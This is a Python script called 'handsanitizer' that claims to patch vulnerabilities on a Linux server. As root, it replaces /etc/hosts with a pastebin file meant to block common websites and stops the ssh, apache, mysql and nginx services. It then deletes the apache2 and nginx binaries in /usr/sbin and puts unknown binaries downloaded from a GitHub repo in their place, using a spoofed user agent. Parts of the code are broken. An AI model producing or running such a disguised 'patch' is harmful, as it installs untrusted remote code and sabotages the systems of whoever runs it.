import os
from os import path
import sys
import time

# Installs packages
os.system("sudo apt install python-pip -qq")
os.system("sudo pip install scrapy")
os.system("sudo pip install colorama")
os.system("sudo apt install wget -qq")
os.system ("sudo pip install fileinput")

import fileinput
import colorama
from colorama import Fore, Back

print(Back.RED + "\nREMAINING STORAGE")
print(Back.BLACK + "")
print(Fore.GREEN + "\n")
os.system("df -h /")
print(Fore.WHITE + "\nPackages Installed")
print("Are you root?")

# Gets current user of the system
user = os.system("hostname")

# Creates handsanitizer directory and replaces hosts file with a better one
handsanitizer = "/etc/handsanitizer"
os.chdir("/etc/")
path = os.path.exists(handsanitizer)
if path == "True":
	print("handsanitizer directory already created")
else:
	os.system("sudo mkdir handsanitizer")

# Checks if handsanitizer directory already exists and replaces cow with system hostname
print(Fore.GREEN + "Blocking world's most common websites")
os.system("sudo wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O hosts1 https://pastebin.com/raw/mha5KQXV")
file = '/etc/hosts1'
for line in file:
	if "cow" in line:
		line = line.rstrip()
		line = line.replace(user)
os.system("sudo rm hosts")
os.system("sudo mv hosts1 hosts")
print("\n")
print(Fore.GREEN + "Patch 1 complete")

# End of vulnerability 1
#
# Begin Second vulnerability change of default ttl in /proc/sys/net/ipv4/ip_default_ttl
print("Changing system default TTL")
os.chdir("/proc/sys/net/ipv4/")
os.system("sudo echo \"128\" >> /proc/sys/net/ipv4/ip_default_ttl")
print(Fore.GREEN + "Patch 2 complete")
print(Fore.WHITE + "\n")

# End of vulnerability 2
#
# Begin Third vulnerability of modifying /usr/sbin binary files
print(Fore.RED + "Running Services")
print(Fore.WHITE + "")
os.system("service --status-all")
# Killing services to be able to modify them
print(Fore.YELLOW + "Killing potentially vulnerable services")
os.system("sudo service ssh stop && service apache2 stop && service mysql stop && service nginx stop")
# Replacing SSH files
print(Fore.RED + "Replacing Binary files")
print("Patching ssh files")
os.chdir("/etc/")
os.remove("motd")
os.system("sudo wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O motd https://pastebin.com/raw/xqy0Szky")
print(Fore.GREEN + "Done")
os.remove("issue.net")
os.system("sudo wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O issue.net https://pastebin.com/raw/jzx0Ju8A")
print(Fore.GREEN + "Done")
# Replacing Apache files
print(Fore.RED + "Patching apache server files")
os.chdir("/usr/sbin")
os.remove("apache2")
os.system("wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O nginx https://github.com/CriticalCow/handsanitizer/blob/master/nginx?raw=true")
print(Fore.GREEN + "Done")
# Replacing Nginx files
print(Fore.RED + "Patching nginx server files")
os.remove("nginx")
os.system("wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O apache2 https://github.com/CriticalCow/handsanitizer/blob/master/apache2?raw=true")
print(Fore.GREEN + "Done")
